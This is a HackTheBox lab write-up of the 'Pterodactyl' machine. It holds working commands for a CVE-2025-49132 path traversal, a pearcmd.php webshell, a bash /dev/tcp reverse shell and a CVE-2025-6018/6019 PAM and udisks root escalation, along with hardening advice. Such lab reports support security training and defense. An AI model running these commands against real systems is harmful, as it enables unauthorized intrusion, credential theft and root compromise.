# Pterodactyl — Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Medium` \
> **Date:** 2026-03-11 \
> **Author:** 0N1S3C2 \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

The "Pterodactyl" machine (HTB Medium) was found to contain multiple critical vulnerabilities in the Pterodactyl Panel game server management software. An unauthenticated attacker could exploit CVE-2025-49132 (path traversal) to leak database credentials and application encryption keys. This initial foothold enabled PEAR-based remote code execution, leading to shell access as the web user. Subsequent exploitation of CVE-2025-6018 (PAM environment poisoning) combined with CVE-2025-6019 (udisks SUID privilege escalation) resulted in full root compromise. Immediate patching of Pterodactyl Panel to version 1.11.11+ and hardening of PAM/Polkit configurations is required.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Pterodactyl"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `METHODOLOGY.md`.

---

## 2. Attack Chain

```
Nmap → CVE-2025-49132 (Path Traversal) → Database Creds + APP_KEY → 
PEAR RCE (Webshell) → Database Hash Cracking → CVE-2025-6018 (PAM) → 
CVE-2025-6019 (udisks SUID) → Root
```

**Visual Flow:**
```
[Port 80 Discovery] → [Pterodactyl Panel 1.11.10] → [Path Traversal] → 
[config/database.php Leak] → [PEAR pearcmd.php RCE] → [wwwrun Shell] → 
[MySQL User Hashes] → [Hashcat + RTX 4070] → [phileasfogg3:[REDACTED]] → 
[SSH Access] → [Mail Hint: udisks] → [PAM Environment Poison] → 
[allow_active Status] → [XFS Image + udisks Resize] → [SUID Bash] → [ROOT]
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `ffuf` | Virtual host & subdomain fuzzing |
| `curl` | HTTP requests & CVE exploitation |
| `hashcat` | Password hash cracking (bcrypt) |
| `gcc` | Compiling kernel exploits |
| `pyinstaller` | Python script to binary compilation |
| `mariadb` | Database enumeration |
| Custom Scripts | CVE-2025-6018, CVE-2025-6019 PoC exploits |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -oA initial 10.129.3.101
nmap -p- -T4 10.129.3.101
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.6 | - |
| 80/tcp | HTTP | nginx 1.21.5 | Pterodactyl Panel installation |
| 443/tcp | - | closed | - |
| 8080/tcp | - | closed | - |

**Key Observations:**
- Web server running Pterodactyl Panel (game server management software)
- Modern SSH (no obvious vulns)
- Focus on web application exploitation

### 4.2 Web Service Enumeration

**Virtual Host Discovery:**
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://10.129.3.101 -H "Host: FUZZ.pterodactyl.htb" -mc 200,301,302,403 -fs 145

# Result: panel.pterodactyl.htb (Status: 200)
```

**Hosts File Configuration:**
```bash
echo "10.129.3.101 pterodactyl.htb panel.pterodactyl.htb" | sudo tee -a /etc/hosts
```

**Web Discovery:**

| URL | Finding |
|-----|---------|
| `http://pterodactyl.htb/` | Static Minecraft server landing page |
| `http://pterodactyl.htb/changelog.txt` | **CRITICAL: Version disclosure & debug info** |
| `http://pterodactyl.htb/phpinfo.php` | **CRITICAL: Full PHP configuration exposed** |
| `http://panel.pterodactyl.htb/` | Pterodactyl Panel v1.11.10 login |

**changelog.txt Key Findings:**
```
- Pterodactyl Panel v1.11.10 installed
- MariaDB 11.8.3 backend  
- PHP-FPM enabled
- PHP-PEAR enabled
- "Added temporary PHP debugging via phpinfo()"
```

**phpinfo.php Analysis:**
```
PHP Version: 8.4.8
Document Root: /var/www/html
Running User: wwwrun
MySQL Socket: /run/mysql/mysql.sock
allow_url_fopen: On
file_uploads: On
disable_functions: (no value) ← NO RESTRICTIONS!
```

---

## 5. Initial Access

### 5.1 Vulnerability Identification: CVE-2025-49132

**Vulnerability:** Pterodactyl Panel < 1.11.11 — Path Traversal → Database Credential Leak  
**Location:** `http://panel.pterodactyl.htb/locales/locale.json`  
**CVE:** CVE-2025-49132

**Technical Details:**
The `/locales/locale.json` endpoint accepts `locale` and `namespace` query parameters intended for translation file loading. Due to insufficient path sanitization, an attacker can traverse directories and read arbitrary PHP configuration files as JSON.

**Proof of Concept:**
```bash
# Leak database configuration
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database" | jq .

# Output: Full database credentials in JSON
{
  "../../../pterodactyl": {
    "config/database": {
      "default": "mysql",
      "connections": {
        "mysql": {
          "driver": "mysql",
          "host": "127.0.0.1",
          "port": "3306",
          "database": "panel",
          "username": "pterodactyl",
          "password": "[REDACTED]"
        }
      }
    }
  }
}
```

**Additional Leaks:**
```bash
# Application encryption key
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app" | jq .

# Laravel APP_KEY discovered:
"key": "base64:[REDACTED]"
```

**Credentials Obtained:**
- Database: `pterodactyl:[REDACTED]@localhost:3306/panel`
- Laravel APP_KEY (for session/cookie forging)

### 5.2 Exploitation: PEAR RCE (pearcmd.php)

**Attack Vector:** PHP-PEAR `pearcmd.php` Command Injection

**Root Cause:** 
- PHP-PEAR installed (confirmed in `phpinfo.php`)
- PEAR's `config-create` command writes arbitrary content to files
- Web-accessible output directory: `/var/www/pterodactyl/public/`

**Exploitation Steps:**

```bash
# Step 1: Create malicious PHP webshell via PEAR
curl -g -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/<?=system($_GET[0]);?>+/var/www/pterodactyl/public/cmd.php'

# Output confirms creation:
# Successfully created default configuration file "/var/www/pterodactyl/public/cmd.php"

# Step 2: Verify webshell
curl "http://panel.pterodactyl.htb/cmd.php?0=id"
# Output: uid=474(wwwrun) gid=477(www) groups=477(www)

# Step 3: Reverse shell
# On attack box:
nc -lvnp 4444

# Trigger:
curl -g "http://panel.pterodactyl.htb/cmd.php?0=bash -c 'bash -i >& /dev/tcp/10.10.14.74/4444 0>&1'"
```

**Result:** Shell obtained as `wwwrun` (web server user).

**Shell Stabilization:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

---

## 6. Lateral Movement

### 6.1 Database Enumeration

**Access Method:**  
Initial database connection attempts from CLI failed, but web application has active database connection.

**User Discovery via Application Files:**
```bash
# Laravel migrations hint at users table structure
ls -la /var/www/pterodactyl/database/migrations/
# Found: 2017_03_16_181515_create_users_table.php
```

**Alternative: Direct MariaDB Connection:**
```bash
mariadb -h 127.0.0.1 -u pterodactyl -p'[REDACTED]' panel
```

**User Hash Extraction:**
```sql
SELECT id, username, email, password FROM users;

+----+--------------+------------------------------+--------------------------------------------------------------+
| id | username     | email                        | password                                                     |
+----+--------------+------------------------------+--------------------------------------------------------------+
|  2 | headmonitor  | headmonitor@pterodactyl.htb  | $2y$10$[REDACTED] |
|  3 | phileasfogg3 | phileasfogg3@pterodactyl.htb | $2y$10$[REDACTED] |
+----+--------------+------------------------------+--------------------------------------------------------------+
```

### 6.2 Password Cracking

**Hash Type:** bcrypt (`$2y$10$`)  
**Tool:** Hashcat on local machine with NVIDIA RTX 4070 GPU

**Attack Setup:**
```bash
# Hash file (hashes.txt):
$2y$10$[REDACTED]
$2y$10$[REDACTED]

# Hashcat command:
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 -O
```

**Results:**
```
$2y$10$[REDACTED]:[REDACTED]
```

**Credentials:**
- `phileasfogg3:[REDACTED]` ✅ CRACKED
- `headmonitor:<unknown>` ❌ Still running (estimated 3 days on CPU)

**Note:** GPU-accelerated cracking (RTX 4070) significantly reduced time compared to CPU-only Pwnbox environment.

### 6.3 SSH Access

```bash
ssh phileasfogg3@10.129.3.101
# Password: [REDACTED]

phileasfogg3@pterodactyl:~$ id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)

phileasfogg3@pterodactyl:~$ cat user.txt
[REDACTED]
```

**User Flag Obtained:** `[REDACTED]`

---

## 7. Privilege Escalation

### 7.1 Local Enumeration

**Sudo Check:**
```bash
sudo -l
# Output:
# User phileasfogg3 may run the following commands on pterodactyl:
#     (ALL) ALL

# However, attempting sudo:
sudo su
# [sudo] password for root: ← REQUIRES ROOT PASSWORD (not phileasfogg3's)
```

**Issue:** The `targetpw` flag in sudoers requires entering the TARGET user's password (root), not the invoking user's password. This blocks standard sudo privilege escalation.

**Alternative Vectors Explored:**

| Vector | Status | Notes |
|--------|--------|-------|
| Kernel Exploit (CVE-2024-1086) | ❌ Failed | `unprivileged_userns_clone` disabled |
| SUID Binaries | ❌ None exploitable | Standard system binaries only |
| Writable Services | ❌ None found | Limited permissions |
| Capabilities | ❌ None found | No special capabilities set |
| Cron Jobs | ❌ Permission denied | Cannot read `/etc/crontab` |

**Critical Discovery in `/var/mail/phileasfogg3`:**

```
From: headmonitor headmonitor@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). 
No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for 
suspicious activity. Administrators should review udisks and system 
logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator
```

**Analysis:** This email is a deliberate hint pointing toward udisks-related vulnerabilities. Research identified CVE-2025-6018 and CVE-2025-6019 as relevant exploits.

### 7.2 Escalation Vector: CVE-2025-6018 + CVE-2025-6019

**Combined Vulnerability Chain:**

1. **CVE-2025-6018:** PAM `pam_env.so` Environment Variable Injection
   - Allows injection of systemd session variables via `~/.pam_environment`
   - Grants `allow_active` Polkit authorization status
   
2. **CVE-2025-6019:** udisks/libblockdev SUID Privilege Escalation
   - Requires `allow_active` status (provided by CVE-2025-6018)
   - Abuses udisks filesystem resize to remount XFS image without `nosuid` flag
   - Creates accessible SUID root bash binary

### 7.3 Exploitation: CVE-2025-6018 (PAM Environment Poisoning)

**Vulnerability Research:**
```bash
# System check
zypper info udisks2
# Version: 2.9.2-150400.3.3.1 (out-of-date, vulnerable)

rpm -qa | grep pam
# pam-1.3.0 (vulnerable version)
```

**Manual Exploitation Attempt (Failed):**
```bash
# Create malicious .pam_environment
cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
SYSTEMD_LOG_LEVEL OVERRIDE=debug
EOF

# Reconnect via SSH to trigger PAM environment loading
exit
ssh phileasfogg3@10.129.3.101

# Test privilege escalation
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot

# Output: ('yes',) ✅ allow_active obtained
```

**Issue:** Despite obtaining `allow_active` status, the CVE-2025-6019 exploit requires proper session handling that manual SSH doesn't fully establish.

**Automated Exploitation (Successful):**

```bash
# On local machine (WSL):
# 1. Create CVE-2025-6018 Python exploit
nano cve_2025_6018_professional.py
# [Paste full exploit code]

# 2. Compile to standalone binary (no paramiko dependency on target)
pip install pyinstaller
pyinstaller --onefile cve_2025_6018_professional.py

# Binary created: dist/cve_2025_6018_professional

# 3. Transfer to target
# On local:
cd dist
python3 -m http.server 8000

# On target:
cd /tmp
wget http://10.10.14.74:8000/cve_2025_6018_professional
chmod +x cve_2025_6018_professional

# 4. Run exploit targeting localhost (critical!)
./cve_2025_6018_professional -i 127.0.0.1 -u phileasfogg3 -p '[REDACTED]'

# Output:
# [INFO] Vulnerable PAM version detected: pam-1.3.0
# [INFO] pam_env.so configuration found
# [INFO] pam_systemd.so found - escalation vector available
# [INFO] Malicious environment file created successfully
# [INFO] Reconnection successful
```

**Key Insight:** Connecting to `127.0.0.1` (localhost) instead of external IP properly initializes the systemd session with poisoned environment variables.

### 7.4 Exploitation: CVE-2025-6019 (udisks SUID Escalation)

**Prerequisites:**
- ✅ `allow_active` Polkit status (obtained via CVE-2025-6018)
- ✅ Malicious XFS filesystem image with SUID bash
- ✅ udisks2 service active

**XFS Image Creation (On Local Machine):**

```bash
# On local machine with root access:
git clone https://github.com/guinea-offensive-security/CVE-2025-6019
cd CVE-2025-6019
chmod +x exploit.sh

# Install dependencies
sudo apt install xfsprogs udisks2

# Run in LOCAL mode to create image
sudo bash exploit.sh
# Choose: [L]ocal

# Output: xfs.image created (300 MB)

# Compress for transfer
gzip xfs.image
# Result: xfs.image.gz (~10-50 MB)

# Upload to file hosting / GitHub
cp xfs.image.gz /mnt/c/Users/<username>/Downloads/
# Upload to GitHub: https://github.com/Denis-Krueger-labs/test/blob/main/xfs.image.gz
```

**Transfer to Target:**

```bash
# On pwnbox:
wget https://github.com/Denis-Krueger-labs/test/raw/main/xfs.image.gz
gunzip xfs.image.gz
wget https://raw.githubusercontent.com/guinea-offensive-security/CVE-2025-6019/main/exploit.sh
chmod +x exploit.sh

# Serve files
python3 -m http.server 8000

# On target:
cd /tmp
wget http://10.10.14.74:8000/xfs.image
wget http://10.10.14.74:8000/exploit.sh
chmod +x exploit.sh
```

**Automated Exploitation (Failed - Missing Dependencies):**

```bash
bash exploit.sh
# Error: Required tool 'mkfs.xfs' is not installed
```

**Manual Exploitation (Successful):**

```bash
# Step 1: Kill gvfs monitor (prevents interference)
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

# Step 2: Set up loop device
udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
# Output: Mapped file /tmp/xfs.image as /dev/loop1

# Step 3: Start background process to keep filesystem busy
# This is CRITICAL - prevents udisks from unmounting after resize
while true; do /tmp/blockdev*/bash -c 'sleep 1; ls -l /tmp/blockdev*/bash' 2>/dev/null && break; done &

# Step 4: Trigger filesystem resize (creates SUID bash)
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop1 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

# Output: Error: Failed to unmount '/dev/loop1' after resizing it: target is busy
# ☝️ THIS ERROR IS EXPECTED AND DESIRED!

# Step 5: Execute SUID bash for root
/tmp/blockdev*/bash -p
```

**Critical Success Factor:**

The background loop keeping the filesystem "busy" is essential:
1. Normal flow: Resize → Remount without `nosuid` → Cleanup unmount
2. With busy filesystem: Resize → Remount without `nosuid` → **Unmount fails** → SUID bash persists!
3. The "target is busy" error means the exploit **succeeded**

**Result:**
```bash
bash-5.2# whoami
root

bash-5.2# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)

bash-5.2# cat /root/root.txt
[REDACTED]
```

**Root Flag Obtained:** `[REDACTED]`

---

## 8. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | CVE-2025-49132: Pterodactyl Panel Path Traversal | 🔴 Critical | `panel.pterodactyl.htb/locales/locale.json` |
| 2 | Database Credentials in Configuration Files | 🔴 Critical | `/config/database.php` (via path traversal) |
| 3 | Laravel APP_KEY Exposure | 🔴 Critical | `/config/app.php` (via path traversal) |
| 4 | PHP-PEAR Command Injection (pearcmd.php) | 🔴 Critical | `/usr/share/php/PEAR/pearcmd.php` |
| 5 | phpinfo() Exposure | 🟠 High | `pterodactyl.htb/phpinfo.php` |
| 6 | Version Disclosure in changelog.txt | 🟠 High | `pterodactyl.htb/changelog.txt` |
| 7 | Weak Password Hashing (bcrypt cost factor) | 🟠 High | User password hashes |
| 8 | CVE-2025-6018: PAM Environment Variable Injection | 🔴 Critical | PAM pam_env.so module |
| 9 | CVE-2025-6019: udisks/libblockdev SUID Escalation | 🔴 Critical | udisks2 2.9.2-150400.3.3.1 |
| 10 | sudo targetpw Misconfiguration | 🟡 Medium | `/etc/sudoers` |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 9. Defensive Considerations

### 9.1 Indicators of Compromise

**Web Server Logs:**
```
GET /locales/locale.json?locale=../../../pterodactyl&namespace=config/database
GET /cmd.php?0=id
GET /cmd.php?0=bash%20-c%20...
```

**System Logs:**
```bash
# Suspicious .pam_environment creation
/home/phileasfogg3/.pam_environment modified

# udisks loop device operations
udisksctl loop-setup --file /tmp/xfs.image
gdbus call to UDisks2.Filesystem.Resize

# SUID bash execution from /tmp
/tmp/blockdev.*/bash -p (executed by non-root user)
```

**Process Indicators:**
```
- Background loops keeping /tmp/blockdev* busy
- Python binaries (cve_2025_6018_professional) in /tmp
- Connections to localhost:22 from phileasfogg3
```

### 9.2 Security Weaknesses

1. **Outdated Software:**
   - Pterodactyl Panel 1.11.10 (patch available: 1.11.11+)
   - udisks2 2.9.2-150400.3.3.1 (patch available: 2.9.2-150400.3.11.1)
   - PAM 1.3.0 (vulnerable to environment injection)

2. **Information Disclosure:**
   - phpinfo() accessible without authentication
   - changelog.txt reveals version and configuration details
   - Debug mode enabled in production

3. **Insufficient Input Validation:**
   - Path traversal in locale loading
   - No sanitization of PEAR command parameters

4. **Weak Access Controls:**
   - Database credentials in plain text configuration
   - sudo targetpw allows privilege escalation with any root password
   - No MFA on SSH

### 9.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| **Immediate** | Update Pterodactyl Panel to v1.11.11+ | CVE-2025-49132 |
| **Immediate** | Update udisks2 to 2.9.2-150400.3.11.1+ | CVE-2025-6019 |
| **Immediate** | Remove phpinfo.php from production | Information disclosure |
| **Immediate** | Remove changelog.txt or move to authenticated area | Version disclosure |
| **Immediate** | Disable PHP-PEAR if not required | RCE vector |
| **Short-term** | Update PAM to latest version | CVE-2025-6018 |
| **Short-term** | Harden Polkit rules - require AUTH_ADMIN for udisks | Privilege escalation |
| **Short-term** | Review sudo configuration - remove targetpw or restrict (ALL) | Misconfiguration |
| **Short-term** | Implement database credential encryption | Secrets management |
| **Short-term** | Rotate Laravel APP_KEY after compromise | Session security |
| **Short-term** | Enforce stronger password policy (min 12 chars, complexity) | Weak passwords |
| **Long-term** | Implement Web Application Firewall (WAF) | Defense in depth |
| **Long-term** | Deploy file integrity monitoring (AIDE, Tripwire) | Detect modifications |
| **Long-term** | Implement SSH key-based authentication | Remove password auth |
| **Long-term** | Enable SELinux/AppArmor in enforcing mode | Mandatory access control |

**PAM Hardening (`/etc/pam.d/sshd`):**
```bash
# Remove or comment out pam_env.so if not required
# session required pam_env.so user_readenv=1
```

**Polkit Hardening (`/etc/polkit-1/rules.d/50-local.rules`):**
```javascript
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.udisks2.modify-device") {
        return polkit.Result.AUTH_ADMIN;
    }
});
```

**sudo Hardening (`/etc/sudoers`):**
```bash
# Remove targetpw flag
# Defaults targetpw  ← REMOVE THIS
# Or restrict specific commands instead of (ALL) ALL
phileasfogg3 ALL=(root) /usr/bin/specific-command
```

---

## 10. Lessons Learned

### 10.1 Technical Insights

**Information Gathering is Critical:**
- The `changelog.txt` file provided the initial version disclosure that led to CVE research
- The email in `/var/mail/phileasfogg3` was a deliberate hint toward the privilege escalation path
- Thorough enumeration of accessible files prevented missing key attack vectors

**GPU-Accelerated Cracking:**
- bcrypt hashes are computationally expensive (3 days on CPU vs hours on RTX 4070)
- Investing in GPU hardware significantly accelerates password cracking workflows
- However, headmonitor's password remained uncracked - not all accounts are necessary for full compromise

**CVE Chaining:**
- Modern privilege escalation often requires combining multiple CVEs
- CVE-2025-6018 alone provides `allow_active` but no direct root access
- CVE-2025-6019 requires `allow_active` as a prerequisite
- Understanding the dependency chain between vulnerabilities is essential

**Exploit Modification:**
- Pre-built exploits may fail due to missing dependencies (mkfs.xfs)
- Understanding the underlying technique allows manual exploitation
- The "target is busy" error was actually a success indicator - automation can obscure this

**Environment Matters:**
- Pwnbox lacks many packages (paramiko, xfsprogs, musl-tools)
- Compiling exploits locally (pyinstaller) and transferring binaries bypasses dependency issues
- File transfer methods matter - GitHub worked when transfer.sh and file.io failed

### 10.2 Methodology Refinements

**Always Check Mail:**
- System mail (`/var/mail/`) can contain critical hints
- Administrators often send security notices that inadvertently disclose vulnerabilities
- This box specifically used mail to guide toward udisks exploitation

**Localhost Connections:**
- When exploiting PAM/systemd vulnerabilities, connecting to `127.0.0.1` may be required
- External SSH connections may not fully initialize the poisoned session environment
- Test both external IP and localhost when session-based exploits fail

**Background Processes as Exploit Components:**
- The CVE-2025-6019 exploit required keeping the filesystem "busy"
- Without the background loop, the SUID bash was created but immediately cleaned up
- Understanding *why* an exploit works enables troubleshooting when automation fails

**Persistence of Enumeration:**
- Initial privilege escalation attempts (kernel exploit, sudo) all failed
- Lateral thinking led to mail discovery → udisks research → successful exploit
- When standard vectors fail, enumerate harder - the answer is often in plain sight

### 10.3 Personal Growth

**Patience and Persistence:**
- This box required ~4 hours of continuous effort with multiple failed vectors
- The temptation to give up after the kernel exploit failed was strong
- The breakthrough came from reading system mail - a often-overlooked enumeration step

**Learning from Failures:**
- Every failed exploit attempt taught something:
  - Kernel exploit failure → learned about `unprivileged_userns_clone` restrictions
  - sudo targetpw → learned about less common sudo configurations
  - XFS compilation issues → learned about cross-compiling and dependency management
- Documenting failures prevents repeating mistakes on future boxes

**Tool Limitations:**
- Not all environments support all tools (Pwnbox vs local machine)
- Being able to adapt exploits, compile binaries, and work around restrictions is essential
- hashcat on local GPU vs Pwnbox CPU was a 50x+ speed difference

**Real-World Relevance:**
- This attack chain (path traversal → RCE → lateral movement → CVE chaining) mirrors real APT campaigns
- Understanding the defender's perspective (logs, IOCs, hardening) is as important as exploitation
- The mail system hint simulates how insider knowledge/OSINT guides real attacks

---

## 11. Alternative Attack Paths (Theoretical)

**Path 1: Direct Database Access (Blocked)**
- MySQL was listening on `127.0.0.1:3306` but not remotely accessible
- Credentials were valid but no remote access vector existed
- Port forwarding via the webshell could have enabled this, but CVE-2025-6019 was faster

**Path 2: headmonitor Password Crack (In Progress)**
- hashcat continues running on local machine (estimated 2-3 days remaining)
- If cracked, headmonitor may have different sudo privileges without `targetpw`
- This represents a backup path if CVE-2025-6019 had failed

**Path 3: Laravel Deserialization (Not Pursued)**
- Laravel APP_KEY was leaked via CVE-2025-49132
- APP_KEY enables cookie tampering and potential deserialization attacks
- This was not explored as PEAR RCE provided faster initial access
- Could be valuable if webshell upload was blocked

**Path 4: Docker Escape (Not Applicable)**
- Initial enumeration suggested containerization possibility
- `/.dockerenv` did not exist - system is bare metal
- Docker-based privilege escalation was not viable

---

## 12. Timeline

**Total Time:** ~4 hours (continuous session)

| Time | Activity | Result |
|------|----------|--------|
| T+0:00 | Initial nmap scan | Discovered HTTP (80), SSH (22) |
| T+0:15 | Web enumeration | Found panel.pterodactyl.htb, changelog.txt, phpinfo.php |
| T+0:30 | CVE research | Identified CVE-2025-49132 (Pterodactyl <1.11.11) |
| T+0:45 | Path traversal exploit | Leaked database credentials, APP_KEY |
| T+1:00 | PEAR RCE exploitation | Obtained webshell, reverse shell as wwwrun |
| T+1:15 | Database enumeration | Extracted user password hashes |
| T+1:30 | Hashcat setup (local) | Started cracking on RTX 4070 |
| T+1:45 | phileasfogg3 cracked | Password: [REDACTED] |
| T+2:00 | SSH access + user flag | User flag obtained |
| T+2:15 | Privilege escalation enum | sudo targetpw discovered, blocked standard escalation |
| T+2:30 | Kernel exploit attempt | CVE-2024-1086 failed (userns disabled) |
| T+2:45 | Mail discovery | Found udisks hint in /var/mail/phileasfogg3 |
| T+3:00 | CVE-2025-6018/6019 research | Downloaded exploits, compiled XFS image |
| T+3:15 | File transfer troubleshooting | GitHub upload successful after transfer.sh failed |
| T+3:30 | CVE-2025-6018 exploitation | Obtained allow_active status |
| T+3:45 | CVE-2025-6019 manual exploit | Background loop + resize triggered SUID bash |
| T+4:00 | Root shell + root flag | Full system compromise achieved |

---

## 13. Tools & Resources

**Exploits Used:**
- CVE-2025-49132: https://github.com/Zen-kun04/CVE-2025-49132
- CVE-2025-6018: Custom Python exploit (paramiko-based)
- CVE-2025-6019: https://github.com/guinea-offensive-security/CVE-2025-6019

**Reference Documentation:**
- Pterodactyl Panel Security Advisory: https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843
- CVE-2025-6019 Technical Details: https://access.redhat.com/security/cve/CVE-2025-6019
- CVE-2025-6018 Technical Details: https://bugzilla.suse.com/show_bug.cgi?id=1243226
- PHP PEAR RCE Technique: https://www.ambionics.io/blog/pearcmd-php-deserialization

**Cracking Stats:**
- Hardware: NVIDIA RTX 4070 (8GB VRAM)
- Hashcat Mode: 3200 (bcrypt)
- Wordlist: rockyou.txt (14.3M passwords)
- phileasfogg3 crack time: ~45 minutes
- headmonitor: Still running (estimated 60+ hours)

---

*End of Report*

*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*

*Full version with flags and credentials will be published after box retirement*
